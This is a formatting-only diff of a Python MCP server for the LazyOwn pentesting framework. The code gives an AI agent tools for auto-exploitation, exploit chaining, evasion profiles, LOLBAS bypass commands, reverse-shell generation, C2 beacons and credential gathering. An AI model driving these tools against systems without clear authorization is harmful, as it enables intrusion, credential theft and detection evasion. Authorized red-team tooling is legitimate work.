@@ -47,26 +47,26 @@ for _p in [str(_mcp_lazyown / "modules"), str(_mcp_root)]:
     if _p not in sys.path:
         sys.path.insert(0, _p)
 
-_ENGINE_AVAILABLE     = None
-_BRIDGE_AVAILABLE     = None
-_STATE_AVAILABLE      = None
-_RECOMMENDER_AVAILABLE= None
-_NARRATOR_AVAILABLE   = None
-_POLICY_AVAILABLE     = None
-_FACTS_AVAILABLE      = None
+_ENGINE_AVAILABLE = None
+_BRIDGE_AVAILABLE = None
+_STATE_AVAILABLE = None
+_RECOMMENDER_AVAILABLE = None
+_NARRATOR_AVAILABLE = None
+_POLICY_AVAILABLE = None
+_FACTS_AVAILABLE = None
 _OBJECTIVES_AVAILABLE = None
-_LLM_AVAILABLE        = None
+_LLM_AVAILABLE = None
 _AUTOMAPPER_AVAILABLE = None
-_PDB_AVAILABLE        = None
-_HIVE_AVAILABLE       = None
-_AUTO_AVAILABLE       = None
-_ACI_AVAILABLE        = None
+_PDB_AVAILABLE = None
+_HIVE_AVAILABLE = None
+_AUTO_AVAILABLE = None
+_ACI_AVAILABLE = None
 
 # Lazy singletons (populated on first use)
-_policy    = None
-_facts     = None
-_objectives= None
-_AutoMapper= None
+_policy = None
+_facts = None
+_objectives = None
+_AutoMapper = None
 
 
 def _ensure_engine():
@@ -85,6 +85,7 @@ def _ensure_engine():
         from event_engine import (
             is_running as _hb_is_running,
         )
+
         _ENGINE_AVAILABLE = True
     except ImportError:
         _ENGINE_AVAILABLE = False
@@ -103,6 +104,7 @@ def _ensure_bridge():
             list_agents,
             start_agent,
         )
+
         _BRIDGE_AVAILABLE = True
     except ImportError:
         _BRIDGE_AVAILABLE = False
@@ -117,6 +119,7 @@ def _ensure_state():
         global _state_load, _state_refresh
         from session_state import load as _state_load
         from session_state import refresh as _state_refresh
+
         _STATE_AVAILABLE = True
     except ImportError:
         _STATE_AVAILABLE = False
@@ -130,6 +133,7 @@ def _ensure_recommender():
     try:
         global _recommend
         from recommender import recommend_and_save as _recommend
+
         _RECOMMENDER_AVAILABLE = True
     except ImportError:
         _RECOMMENDER_AVAILABLE = False
@@ -144,6 +148,7 @@ def _ensure_narrator():
         global _narrate, _load_timeline
         from timeline_narrator import load_timeline as _load_timeline
         from timeline_narrator import narrate as _narrate
+
         _NARRATOR_AVAILABLE = True
     except ImportError:
         _NARRATOR_AVAILABLE = False
@@ -156,6 +161,7 @@ def _ensure_policy():
         return _POLICY_AVAILABLE
     try:
         from lazyown_policy import LazyOwnPolicyIntegration as _PI
+
         _policy = _PI()
         _POLICY_AVAILABLE = True
     except Exception:
@@ -170,14 +176,17 @@ def _ensure_facts():
     try:
         from lazyown_facts import FactStore as _FS
         from lazyown_facts import create_tool_file as _ctf
+
         global _create_tool_file
         _facts = _FS()
         _create_tool_file = _ctf
         _FACTS_AVAILABLE = True
     except Exception:
         _FACTS_AVAILABLE = False
+
         def _create_tool_file(*_a, **_kw):
             raise RuntimeError("lazyown_facts not available")
+
     return _FACTS_AVAILABLE
 
 
@@ -201,11 +210,12 @@ def _ensure_objectives():
         from lazyown_objective import (
             write_soul as _ws,
         )
+
         global _read_soul, _write_soul, _current_plan, _full_context_for_claude
-        _objectives       = _OS()
-        _read_soul        = _rs
-        _write_soul       = _ws
-        _current_plan     = _cp
+        _objectives = _OS()
+        _read_soul = _rs
+        _write_soul = _ws
+        _current_plan = _cp
         _full_context_for_claude = _fc
         _OBJECTIVES_AVAILABLE = True
     except Exception:
@@ -221,6 +231,7 @@ def _ensure_llm():
         global _llm_ask, _build_bridge
         from lazyown_llm import build_bridge as _build_bridge
         from lazyown_llm import llm_ask as _llm_ask
+
         _LLM_AVAILABLE = True
     except Exception:
         _LLM_AVAILABLE = False
@@ -233,6 +244,7 @@ def _ensure_automapper():
         return _AUTOMAPPER_AVAILABLE
     try:
         from lazyown_automapper import AutoMapper as _AM
+
         _AutoMapper = _AM
         _AUTOMAPPER_AVAILABLE = True
     except Exception:
@@ -246,12 +258,15 @@ def _ensure_pdb():
         return _PDB_AVAILABLE
     try:
         from lazyown_parquet_db import get_pdb as _gpdb
+
         _get_pdb = _gpdb
         _PDB_AVAILABLE = True
     except Exception:
         _PDB_AVAILABLE = False
+
         def _get_pdb(_=None):
             return None
+
     return _PDB_AVAILABLE
 
 
@@ -289,6 +304,7 @@ def _ensure_hive():
         from hive_mind import (
             mcp_hive_status as _hive_status,
         )
+
         _HIVE_AVAILABLE = True
     except Exception:
         _HIVE_AVAILABLE = False
@@ -316,6 +332,7 @@ def _ensure_auto():
         from autonomous_daemon import (
             mcp_autonomous_stop as _auto_stop,
         )
+
         _AUTO_AVAILABLE = True
     except Exception:
         _AUTO_AVAILABLE = False
@@ -337,6 +354,7 @@ def _ensure_aci():
         from aci_planner import (
             mcp_aci_status as _aci_status,
         )
+
         _ACI_AVAILABLE = True
     except Exception:
         _ACI_AVAILABLE = False
@@ -350,8 +368,12 @@ _narrate = _load_timeline = None
 _create_tool_file = None
 _read_soul = _write_soul = _current_plan = _full_context_for_claude = None
 _llm_ask = _build_bridge = None
+
+
 def _get_pdb(_=None):
     return None
+
+
 _get_hive = _hive_spawn = _hive_status = _hive_recall = None
 _hive_plan = _hive_result = _hive_collect = _hive_forget = _hive_recover = None
 _auto_start = _auto_stop = _auto_status = _auto_inject = _auto_events = None
@@ -362,11 +384,11 @@ from mcp import types  # noqa: E402
 from mcp.server.stdio import stdio_server  # noqa: E402
 
 # ── Harness layer singletons (lazy — depend on SESSIONS_DIR set below) ────────
-_perm_system        = None   # PermissionSystem
-_hook_registry      = None   # HookRegistry
-_session_transcript = None   # SessionTranscript
-_compact_output_fn  = None   # compact_output callable
-_claudemd_loader    = None   # ClaudeMdLoader
+_perm_system = None  # PermissionSystem
+_hook_registry = None  # HookRegistry
+_session_transcript = None  # SessionTranscript
+_compact_output_fn = None  # compact_output callable
+_claudemd_loader = None  # ClaudeMdLoader
 
 
 def _get_perm_system():
@@ -375,6 +397,7 @@ def _get_perm_system():
     if _perm_system is None:
         try:
             from lazyown_permissions import PermissionSystem
+
             _perm_system = PermissionSystem(SESSIONS_DIR)
         except Exception:
             pass
@@ -387,6 +410,7 @@ def _get_hooks():
     if _hook_registry is None:
         try:
             from lazyown_hooks import get_registry
+
             _hook_registry = get_registry(SESSIONS_DIR)
         except Exception:
             pass
@@ -399,6 +423,7 @@ def _get_transcript():
     if _session_transcript is None:
         try:
             from lazyown_session import get_transcript
+
             _session_transcript = get_transcript(SESSIONS_DIR)
         except Exception:
             pass
@@ -411,10 +436,13 @@ def _compact(content: str, tool_name: str = "_default") -> str:
     if _compact_output_fn is None:
         try:
             from lazyown_context import compact_output
+
             _compact_output_fn = compact_output
         except Exception:
+
             def _compact_output_fn(c, t="_default"):
                 return c
+
     return _compact_output_fn(content, tool_name)
 
 
@@ -424,18 +452,20 @@ def _get_claudemd():
     if _claudemd_loader is None:
         try:
             from lazyown_claudemd import ClaudeMdLoader
+
             _claudemd_loader = ClaudeMdLoader(LAZYOWN_DIR)
         except Exception:
             pass
     return _claudemd_loader
 
+
 # ── Paths ─────────────────────────────────────────────────────────────────────
-SKILLS_DIR   = Path(__file__).parent
+SKILLS_DIR = Path(__file__).parent
 LAZYOWN_DIR = Path(os.environ.get("LAZYOWN_DIR", str(SKILLS_DIR.parent)))
 PAYLOAD_FILE = LAZYOWN_DIR / "payload.json"
 SESSIONS_DIR = LAZYOWN_DIR / "sessions"
-BASE_DIR     = LAZYOWN_DIR
-MODULES_DIR  = LAZYOWN_DIR / "modules"
+BASE_DIR = LAZYOWN_DIR
+MODULES_DIR = LAZYOWN_DIR / "modules"
 
 # ── Helper module (pure-function logic for new high-impact tools) ─────────────
 from lazyown_mcp_helpers import (  # noqa: E402
@@ -458,17 +488,18 @@ _job_store = JobStore()
 # Keys match ActionCategory values from lazyown_policy.py.
 # Override by placing a policy_command_map.json in sessions/.
 _CATEGORY_COMMAND_MAP: dict = {
-    "recon":       "lazynmap",
-    "enum":        "enum_smb",
+    "recon": "lazynmap",
+    "enum": "enum_smb",
     "brute_force": "crackmapexec",
-    "exploit":     "searchsploit",
-    "intrusion":   "evil-winrm",
-    "privesc":     "linpeas",
-    "credential":  "secretsdump",
-    "lateral":     "crackmapexec",
-    "payload":     "generate_reverse_shell",
-    "other":       "list",
+    "exploit": "searchsploit",
+    "intrusion": "evil-winrm",
+    "privesc": "linpeas",
+    "credential": "secretsdump",
+    "lateral": "crackmapexec",
+    "payload": "generate_reverse_shell",
+    "other": "list",
 }
+
 
 def _load_category_command_map() -> dict:
     """Return the category→command map, merging any user overrides from sessions/."""
@@ -494,11 +525,11 @@ if _PDB_AVAILABLE:
         # Auto-sync CSV on startup (fast — only new rows are ingested)
         if _pdb is not None:
             import threading as _threading
-            _threading.Thread(
-                target=lambda: _pdb.sync(), daemon=True, name="pdb-sync"
-            ).start()
+
+            _threading.Thread(target=lambda: _pdb.sync(), daemon=True, name="pdb-sync").start()
     except Exception as _pdb_err:
         import logging as _logging
+
         _logging.getLogger("lazyown_mcp").warning(f"ParquetDB init failed: {_pdb_err}")
 
 # ── Auto-mapper — initialise after LAZYOWN_DIR is set ─────────────────────────
@@ -510,10 +541,12 @@ if _AUTOMAPPER_AVAILABLE and _AutoMapper is not None:
         _automapper.update_skills_md(SKILLS_DIR / "lazyown.md")
     except Exception as _ae:
         import logging as _logging
+
         _logging.getLogger("lazyown_mcp").warning(f"automapper init failed: {_ae}")
 
 
 # ── Helpers ───────────────────────────────────────────────────────────────────
+
 
 def _load_payload() -> dict:
     """Load payload.json, return empty dict on failure."""
@@ -555,6 +588,7 @@ def _c2_request(path: str, method: str = "GET", body: dict | None = None) -> dic
     url = f"https://{host}:{port}{path}"
 
     import base64
+
     token = base64.b64encode(f"{user}:{passwd}".encode()).decode()
     headers = {"Authorization": f"Basic {token}", "Content-Type": "application/json"}
 
@@ -620,9 +654,15 @@ def _dispatch_perm_check(name: str, arguments: dict) -> list[types.TextContent] 
             hooks = _get_hooks()
             if hooks is not None:
                 from lazyown_hooks import HookEvent
-                hooks.run(HookEvent.PERMISSION_DENIED, {
-                    "tool_name": name, "arguments": arguments, "_event": "permission_denied",
-                })
+
+                hooks.run(
+                    HookEvent.PERMISSION_DENIED,
+                    {
+                        "tool_name": name,
+                        "arguments": arguments,
+                        "_event": "permission_denied",
+                    },
+                )
         except Exception:
             pass
         return _make_text(
@@ -678,79 +718,101 @@ def _h_db(arguments: dict, tool_name: str) -> list[types.TextContent]:
         if operation == "workspace_list":
             return _result(db.workspace_list())
         if operation == "workspace_create":
-            return _result({"workspace_id": db.workspace_create(
-                ws_name, arguments.get("description", ""))})
+            return _result({"workspace_id": db.workspace_create(ws_name, arguments.get("description", ""))})
         if operation == "host_list":
             return _result(db.host_list(wid))
         if operation == "host_find":
             return _result(db.host_find(wid, arguments.get("query", "")))
         if operation == "host_add":
-            return _result({"host_id": db.host_add(
-                wid,
-                arguments["address"],
-                arguments.get("mac", ""),
-                arguments.get("hostname", ""),
-                arguments.get("os", ""),
-                arguments.get("state", "unknown"),
-            )})
+            return _result(
+                {
+                    "host_id": db.host_add(
+                        wid,
+                        arguments["address"],
+                        arguments.get("mac", ""),
+                        arguments.get("hostname", ""),
+                        arguments.get("os", ""),
+                        arguments.get("state", "unknown"),
+                    )
+                }
+            )
         if operation == "service_list":
             return _result(db.service_list(int(arguments.get("host_id", 0))))
         if operation == "service_add":
-            return _result({"service_id": db.service_add(
-                int(arguments["host_id"]),
-                int(arguments["port"]),
-                arguments.get("protocol", "tcp"),
-                arguments.get("state", "open"),
-                arguments.get("name", ""),
-                arguments.get("product", ""),
-                arguments.get("version", ""),
-            )})
+            return _result(
+                {
+                    "service_id": db.service_add(
+                        int(arguments["host_id"]),
+                        int(arguments["port"]),
+                        arguments.get("protocol", "tcp"),
+                        arguments.get("state", "open"),
+                        arguments.get("name", ""),
+                        arguments.get("product", ""),
+                        arguments.get("version", ""),
+                    )
+                }
+            )
         if operation == "vuln_list":
             return _result(db.vuln_list(wid, arguments.get("severity") or None))
         if operation == "vuln_add":
-            return _result({"vuln_id": db.vuln_add(
-                int(arguments["host_id"]),
-                arguments["name"],
-                arguments.get("severity", "unknown"),
-                arguments.get("description", ""),
-                arguments.get("refs", ""),
-            )})
+            return _result(
+                {
+                    "vuln_id": db.vuln_add(
+                        int(arguments["host_id"]),
+                        arguments["name"],
+                        arguments.get("severity", "unknown"),
+                        arguments.get("description", ""),
+                        arguments.get("refs", ""),
+                    )
+                }
+            )
         if operation == "cred_list":
             return _result(db.cred_list(wid))
         if operation == "cred_add":
-            return _result({"cred_id": db.cred_add(
-                int(arguments["host_id"]),
-                arguments.get("username", ""),
-                arguments.get("password", ""),
-                arguments.get("realm", ""),
-                arguments.get("cred_type", "password"),
-                arguments.get("origin", "manual"),
-            )})
+            return _result(
+                {
+                    "cred_id": db.cred_add(
+                        int(arguments["host_id"]),
+                        arguments.get("username", ""),
+                        arguments.get("password", ""),
+                        arguments.get("realm", ""),
+                        arguments.get("cred_type", "password"),
+                        arguments.get("origin", "manual"),
+                    )
+                }
+            )
         if operation == "loot_list":
             return _result(db.loot_list(wid))
         if operation == "loot_add":
-            return _result({"loot_id": db.loot_add(
-                wid,
-                arguments["name"],
-                arguments.get("loot_type", "file"),
-                arguments.get("path", ""),
-                arguments.get("notes", ""),
-                int(arguments["host_id"]) if arguments.get("host_id") else None,
-            )})
+            return _result(
+                {
+                    "loot_id": db.loot_add(
+                        wid,
+                        arguments["name"],
+                        arguments.get("loot_type", "file"),
+                        arguments.get("path", ""),
+                        arguments.get("notes", ""),
+                        int(arguments["host_id"]) if arguments.get("host_id") else None,
+                    )
+                }
+            )
         if operation == "note_list":
             return _result(db.note_list(wid))
         if operation == "note_add":
-            return _result({"note_id": db.note_add(
-                wid,
-                arguments.get("notes", arguments.get("data", "")),
-                arguments.get("note_type", "general"),
-                int(arguments["host_id"]) if arguments.get("host_id") else None,
-            )})
+            return _result(
+                {
+                    "note_id": db.note_add(
+                        wid,
+                        arguments.get("notes", arguments.get("data", "")),
+                        arguments.get("note_type", "general"),
+                        int(arguments["host_id"]) if arguments.get("host_id") else None,
+                    )
+                }
+            )
         if operation == "import_nmap":
             return _result(db.import_nmap_xml(wid, arguments.get("xml_path", "")))
         if operation == "export_csv":
-            return _result({"csv": db.export_csv(
-                arguments.get("table", ""), wid)})
+            return _result({"csv": db.export_csv(arguments.get("table", ""), wid)})
         return _make_text(tool_name, f"Unknown operation '{operation}'.")
     except KeyError as error:
         return _make_text(tool_name, f"Missing required argument for {operation}: {error}")
@@ -804,8 +866,10 @@ def _h_set_config(arguments: dict, tool_name: str) -> list[types.TextContent]:
     try:
         from core.payload_schema import coerce_value
     except ImportError:
+
         def coerce_value(k, v):
             return v
+
     cfg = _load_payload()
     coerced = coerce_value(key, value)
     cfg[key] = coerced
@@ -819,6 +883,7 @@ def _h_set_config(arguments: dict, tool_name: str) -> list[types.TextContent]:
 @register_handler("lazyown_list_modules")
 def _h_list_modules(arguments: dict, tool_name: str) -> list[types.TextContent]:
     from modules.module_registry import ModuleRegistry
+
     registry = ModuleRegistry.get_instance(LAZYOWN_DIR)
     filter_type = arguments.get("type")
     modules = registry.search("", filter_type=filter_type)
@@ -864,23 +929,24 @@ async def _h_run_command(arguments: dict, tool_name: str) -> list[types.TextCont
             return f"[via subprocess]\n{_run_lazyown_command(cmd, to)}"
         return f"[via C2 /api/run]\n{output}"
 
-    output = await asyncio.get_event_loop().run_in_executor(
-        None, lambda: _run_with_fallback(command, timeout)
-    )
+    output = await asyncio.get_event_loop().run_in_executor(None, lambda: _run_with_fallback(command, timeout))
 
     try:
         from event_bus import EventCategory, LazyEvent, get_event_bus
+
         parts = command.strip().split(None, 1)
         cmd_name = parts[0] if parts else command
         cfg = _load_payload()
-        get_event_bus().publish(LazyEvent(
-            category=EventCategory.COMMAND,
-            event_type=cmd_name,
-            source="mcp",
-            payload={"command": command, "output_snippet": output[:500]},
-            target=cfg.get("rhost", ""),
-            operator=arguments.get("operator", "mcp"),
-        ))
+        get_event_bus().publish(
+            LazyEvent(
+                category=EventCategory.COMMAND,
+                event_type=cmd_name,
+                source="mcp",
+                payload={"command": command, "output_snippet": output[:500]},
+                target=cfg.get("rhost", ""),
+                operator=arguments.get("operator", "mcp"),
+            )
+        )
     except Exception:
         pass
 
@@ -893,9 +959,7 @@ async def _h_run_command(arguments: dict, tool_name: str) -> list[types.TextCont
         try:
             await asyncio.get_event_loop().run_in_executor(
                 None,
-                lambda: _policy.on_command_complete(
-                    _target, _cmd_name, _cmd_args, output, None
-                ),
+                lambda: _policy.on_command_complete(_target, _cmd_name, _cmd_args, output, None),
             )
         except Exception:
             pass
@@ -907,14 +971,33 @@ REA_BINARY = "rea"
 REA_TIMEOUT_DEFAULT = 120
 REA_TIMEOUT_MAX = 600
 REA_OUTPUT_LIMIT = 8000
-REA_SUPPORTED_ACTIONS = frozenset({
-    "analyze", "inspect", "inspect-artifact", "search", "function", "xrefs",
-    "trace", "decompile", "providers", "capabilities", "doctor",
-})
-REA_TARGET_ACTIONS = frozenset({
-    "analyze", "inspect", "inspect-artifact", "search", "function", "xrefs",
-    "trace", "decompile",
-})
+REA_SUPPORTED_ACTIONS = frozenset(
+    {
+        "analyze",
+        "inspect",
+        "inspect-artifact",
+        "search",
+        "function",
+        "xrefs",
+        "trace",
+        "decompile",
+        "providers",
+        "capabilities",
+        "doctor",
+    }
+)
+REA_TARGET_ACTIONS = frozenset(
+    {
+        "analyze",
+        "inspect",
+        "inspect-artifact",
+        "search",
+        "function",
+        "xrefs",
+        "trace",
+        "decompile",
+    }
+)
 REA_ADDRESS_ACTIONS = frozenset({"function", "xrefs", "decompile"})
 REA_QUERY_ACTIONS = frozenset({"search", "trace"})
 REA_PROVIDERS = frozenset({"auto", "hopper", "ghidra"})
@@ -950,8 +1033,7 @@ async def _h_rea(arguments: dict, tool_name: str) -> list[types.TextContent]:
     if rea_bin is None:
         return _fail(
             "REA CLI not found in PATH.",
-            "Install with: npm install --global rea-agents@4.0.1 "
-            "(see lazyaddons/rea.yaml), then run: rea setup.",
+            "Install with: npm install --global rea-agents@4.0.1 (see lazyaddons/rea.yaml), then run: rea setup.",
         )
 
     provider = str(arguments.get("provider", "auto")).strip().lower() or "auto"
@@ -1035,12 +1117,14 @@ async def _h_rea(arguments: dict, tool_name: str) -> list[types.TextContent]:
 
 # ── New module handlers (ExploitRecommender, EvasionEngine, AutoPivot, Dashboard) ──
 
+
 @register_handler("lazyown_exploit_recommend")
 async def _h_exploit_recommend(arguments: dict, tool_name: str) -> list[types.TextContent]:
     top_n = int(arguments.get("top_n", 10))
     try:
         from modules.exploit_recommender import ExploitRecommender
         from modules.world_model import WorldModel
+
         wm = WorldModel(SESSIONS_DIR)
         if _has_data(SESSIONS_DIR / "world_model.json"):
             wm.load()
@@ -1057,11 +1141,13 @@ async def _h_exploit_recommend(arguments: dict, tool_name: str) -> list[types.Te
     except Exception as exc:
         return _make_text(tool_name, json.dumps({"error": str(exc)}, indent=2))
 
+
 @register_handler("lazyown_evasion_generate")
 async def _h_evasion_generate(arguments: dict, tool_name: str) -> list[types.TextContent]:
     os_family = str(arguments.get("os_family", "windows"))
     try:
         from modules.evasion_engine import EvasionEngine
+
         cfg = _load_payload()
         engine = EvasionEngine(cfg)
         profile = engine.generate_profile(os_family)
@@ -1070,10 +1156,12 @@ async def _h_evasion_generate(arguments: dict, tool_name: str) -> list[types.Tex
     except Exception as exc:
         return _make_text(tool_name, json.dumps({"error": str(exc)}, indent=2))
 
+
 @register_handler("lazyown_evasion_rotate")
 async def _h_evasion_rotate(arguments: dict, tool_name: str) -> list[types.TextContent]:
     try:
         from modules.evasion_engine import EvasionEngine
+
         cfg = _load_payload()
         engine = EvasionEngine(cfg)
         profile = engine.rotate_profile()
@@ -1082,10 +1170,12 @@ async def _h_evasion_rotate(arguments: dict, tool_name: str) -> list[types.TextC
     except Exception as exc:
         return _make_text(tool_name, json.dumps({"error": str(exc)}, indent=2))
 
+
 @register_handler("lazyown_pivot_status")
 async def _h_pivot_status(arguments: dict, tool_name: str) -> list[types.TextContent]:
     try:
         from modules.auto_pivot import AutoPivotEngine
+
         cfg = _load_payload()
         engine = AutoPivotEngine(cfg)
         routes = engine.get_active_routes()
@@ -1100,12 +1190,14 @@ async def _h_pivot_status(arguments: dict, tool_name: str) -> list[types.TextCon
     except Exception as exc:
         return _make_text(tool_name, json.dumps({"error": str(exc)}, indent=2))
 
+
 @register_handler("lazyown_dashboard_snapshot")
 async def _h_dashboard_snapshot(arguments: dict, tool_name: str) -> list[types.TextContent]:
     try:
         from modules.dashboard_engine import DashboardEngine
         from modules.exploit_recommender import ExploitRecommender
         from modules.world_model import WorldModel
+
         wm = WorldModel(SESSIONS_DIR / "world_model.json")
         er = ExploitRecommender(wm)
         de = DashboardEngine(wm)
@@ -1123,6 +1215,7 @@ async def _h_dashboard_snapshot(arguments: dict, tool_name: str) -> list[types.T
 async def _h_unified_dashboard(arguments: dict, tool_name: str) -> list[types.TextContent]:
     try:
         from modules.unified_dashboard import UnifiedDashboard
+
         dashboard = UnifiedDashboard(SESSIONS_DIR)
         if arguments.get("format") == "json":
             return _make_text(tool_name, dashboard.export_json())
@@ -1133,9 +1226,7 @@ async def _h_unified_dashboard(arguments: dict, tool_name: str) -> list[types.Te
 
 @register_handler("lazyown_get_beacons")
 async def _h_get_beacons(arguments: dict, tool_name: str) -> list[types.TextContent]:
-    result = await asyncio.get_event_loop().run_in_executor(
-        None, lambda: _c2_request("/get_connected_clients")
-    )
+    result = await asyncio.get_event_loop().run_in_executor(None, lambda: _c2_request("/get_connected_clients"))
     return _make_text(tool_name, json.dumps(result, indent=2))
 
 
@@ -1147,6 +1238,7 @@ async def _h_auto_pwn(arguments: dict, tool_name: str) -> list[types.TextContent
     stealth = str(arguments.get("stealth", "low"))
     try:
         from modules.autonomous_exploit_engine import AutonomousExploitEngine
+
         engine = AutonomousExploitEngine()
         engine.enable_stealth(stealth)
         result = engine.full_auto_pwn(
@@ -1178,6 +1270,7 @@ async def _h_exploit_chain(arguments: dict, tool_name: str) -> list[types.TextCo
     try:
         from modules.ai_exploit_chain import AIExploitChainer, ExploitChainContext
         from modules.autonomous_exploit_engine import AutonomousExploitEngine
+
         engine = AutonomousExploitEngine()
         profile = engine.profile(target)
         chainer = AIExploitChainer()
@@ -1240,7 +1333,11 @@ async def _h_lolbas_list(arguments: dict, tool_name: str) -> list[types.TextCont
     except ImportError:
         return _make_text(tool_name, json.dumps({"error": "PyYAML not installed"}, indent=2))
     for plugin_file in sorted(plugins_dir.glob("*.yaml")):
-        if "bypass" not in plugin_file.stem and "obfuscation" not in plugin_file.stem and "reflection" not in plugin_file.stem:
+        if (
+            "bypass" not in plugin_file.stem
+            and "obfuscation" not in plugin_file.stem
+            and "reflection" not in plugin_file.stem
+        ):
             continue
         try:
             data = yaml.safe_load(plugin_file.read_text())
@@ -1250,14 +1347,16 @@ async def _h_lolbas_list(arguments: dict, tool_name: str) -> list[types.TextCont
         if filter_cat != "all" and filter_cat not in cat.lower() and filter_cat not in plugin_file.stem.lower():
             continue
         for tech in data.get("techniques", []):
-            techniques.append({
-                "plugin": plugin_file.stem,
-                "name": tech.get("name", ""),
-                "description": tech.get("description", ""),
-                "requires_admin": tech.get("requires_admin", False),
-                "platforms": data.get("platforms", []),
-                "command": tech.get("command", ""),
-            })
+            techniques.append(
+                {
+                    "plugin": plugin_file.stem,
+                    "name": tech.get("name", ""),
+                    "description": tech.get("description", ""),
+                    "requires_admin": tech.get("requires_admin", False),
+                    "platforms": data.get("platforms", []),
+                    "command": tech.get("command", ""),
+                }
+            )
     return _make_text(
         tool_name,
         json.dumps({"count": len(techniques), "techniques": techniques}, indent=2, ensure_ascii=False),
@@ -1280,6 +1379,7 @@ async def _h_lolbas_use(arguments: dict, tool_name: str) -> list[types.TextConte
         return _make_text(tool_name, json.dumps({"error": f"Plugin not found: {plugin_name}"}, indent=2))
     try:
         import yaml
+
         data = yaml.safe_load(plugin_path.read_text())
     except Exception as exc:
         return _make_text(tool_name, json.dumps({"error": f"Failed to load plugin: {exc}"}, indent=2))
@@ -1292,16 +1392,24 @@ async def _h_lolbas_use(arguments: dict, tool_name: str) -> list[types.TextConte
         return _make_text(tool_name, json.dumps({"error": f"Technique '{technique_name}' not found"}, indent=2))
     cfg = _load_payload()
     command = technique.get("command", "")
-    resolved = command.replace("{rhost}", cfg.get("rhost", "")).replace("{lhost}", cfg.get("lhost", "")).replace("{lport}", str(cfg.get("lport", "")))
+    resolved = (
+        command.replace("{rhost}", cfg.get("rhost", ""))
+        .replace("{lhost}", cfg.get("lhost", ""))
+        .replace("{lport}", str(cfg.get("lport", "")))
+    )
     output = _run_lazyown_command(resolved, 30)
     return _make_text(
         tool_name,
-        json.dumps({
-            "plugin": plugin_name,
-            "technique": technique_name,
-            "resolved_command": resolved[:300],
-            "output": output[:3000],
-        }, indent=2, ensure_ascii=False),
+        json.dumps(
+            {
+                "plugin": plugin_name,
+                "technique": technique_name,
+                "resolved_command": resolved[:300],
+                "output": output[:3000],
+            },
+            indent=2,
+            ensure_ascii=False,
+        ),
     )
 
 
@@ -1312,6 +1420,7 @@ async def _h_stealth(arguments: dict, tool_name: str) -> list[types.TextContent]
         return _make_text(tool_name, json.dumps({"error": f"Invalid level: {level}"}, indent=2))
     try:
         from modules.autonomous_exploit_engine import AutonomousExploitEngine
+
         engine = AutonomousExploitEngine.get_instance()
         if level == "off":
             engine.enable_stealth("low")
@@ -1334,6 +1443,7 @@ async def _h_rich_tui_snapshot(arguments: dict, tool_name: str) -> list[types.Te
         from modules.dashboard_engine import DashboardEngine
         from modules.exploit_recommender import ExploitRecommender
         from modules.world_model import WorldModel
+
         wm = WorldModel(SESSIONS_DIR / "world_model.json")
         er = ExploitRecommender(wm)
         de = DashboardEngine(wm)
@@ -1344,13 +1454,18 @@ async def _h_rich_tui_snapshot(arguments: dict, tool_name: str) -> list[types.Te
         cli_status = de.format_for_cli(snapshot)
         return _make_text(
             tool_name,
-            json.dumps({
-                "cli_status": cli_status,
-                "stats": snapshot.get("stats", {}),
-                "text_map": text_map,
-                "topology": topology,
-                "recommendations": snapshot.get("recommendations", [])[:10],
-            }, indent=2, ensure_ascii=False, default=str),
+            json.dumps(
+                {
+                    "cli_status": cli_status,
+                    "stats": snapshot.get("stats", {}),
+                    "text_map": text_map,
+                    "topology": topology,
+                    "recommendations": snapshot.get("recommendations", [])[:10],
+                },
+                indent=2,
+                ensure_ascii=False,
+                default=str,
+            ),
         )
     except Exception as exc:
         return _make_text(tool_name, json.dumps({"error": str(exc)}, indent=2))
@@ -1379,6 +1494,7 @@ async def _h_inject_objective(arguments: dict, tool_name: str) -> list[types.Tex
 @register_handler("lazyown_credentials")
 async def _h_credentials(arguments: dict, tool_name: str) -> list[types.TextContent]:
     import glob as _glob
+
     rows: list[dict] = []
     seen: set[str] = set()
 
@@ -1534,6 +1650,7 @@ def _run_lazyown_command(command: str, timeout: int = 30) -> str:
     reach /dev/tty for password prompts (use sudoers NOPASSWD via setup.sh).
     """
     import re
+
     cmd_input = (command.strip() + "\nexit\n").encode()
 
     run_script = LAZYOWN_DIR / "run"
@@ -1622,6 +1739,7 @@ def _run_lazyown_command(command: str, timeout: int = 30) -> str:
 
 
 # ── Tool definitions ──────────────────────────────────────────────────────────
+
 
 @server.list_tools()
 async def list_tools() -> list[types.Tool]:
@@ -2053,19 +2171,19 @@ async def list_tools() -> list[types.Tool]:
             inputSchema={
                 "type": "object",
                 "properties": {
-                    "id":          {"type": "string", "description": "Unique rule ID (snake_case)."},
+                    "id": {"type": "string", "description": "Unique rule ID (snake_case)."},
                     "description": {"type": "string", "description": "What this rule detects."},
-                    "trigger":     {
+                    "trigger": {
                         "type": "object",
                         "description": "Match conditions. Keys: command, command_contains, args_contains, output_contains.",
                     },
-                    "event_type":  {"type": "string", "description": "Event type emitted (e.g. CREDS_FOUND)."},
-                    "severity":    {
+                    "event_type": {"type": "string", "description": "Event type emitted (e.g. CREDS_FOUND)."},
+                    "severity": {
                         "type": "string",
                         "enum": ["info", "high", "critical"],
                         "default": "info",
                     },
-                    "suggest":     {"type": "string", "description": "Action suggestion shown in the event."},
+                    "suggest": {"type": "string", "description": "Action suggestion shown in the event."},
                 },
                 "required": ["id", "description", "trigger", "event_type"],
             },
@@ -2299,8 +2417,7 @@ async def list_tools() -> list[types.Tool]:
                     "target": {
                         "type": "string",
                         "description": (
-                            "Path to the binary, .app, .asar or directory. "
-                            "Defaults to payload.json 'target'."
+                            "Path to the binary, .app, .asar or directory. Defaults to payload.json 'target'."
                         ),
                         "default": "",
                     },
@@ -2348,8 +2465,19 @@ async def list_tools() -> list[types.Tool]:
                             "cred, lateral, exfil, c2, report. "
                             "If omitted, runs 'help' and returns all shell commands."
                         ),
-                        "enum": ["recon","enum","exploit","postexp","persist","privesc",
-                                 "cred","lateral","exfil","c2","report"],
+                        "enum": [
+                            "recon",
+                            "enum",
+                            "exploit",
+                            "postexp",
+                            "persist",
+                            "privesc",
+                            "cred",
+                            "lateral",
+                            "exfil",
+                            "c2",
+                            "report",
+                        ],
                     }
                 },
             },
@@ -2375,8 +2503,19 @@ async def list_tools() -> list[types.Tool]:
                     "phase": {
                         "type": "string",
                         "description": "Pentest phase to get guide for.",
-                        "enum": ["recon","enum","exploit","postexp","persist","privesc",
-                                 "cred","lateral","exfil","c2","report"],
+                        "enum": [
+                            "recon",
+                            "enum",
+                            "exploit",
+                            "postexp",
+                            "persist",
+                            "privesc",
+                            "cred",
+                            "lateral",
+                            "exfil",
+                            "c2",
+                            "report",
+                        ],
                     },
                     "os_hint": {
                         "type": "string",
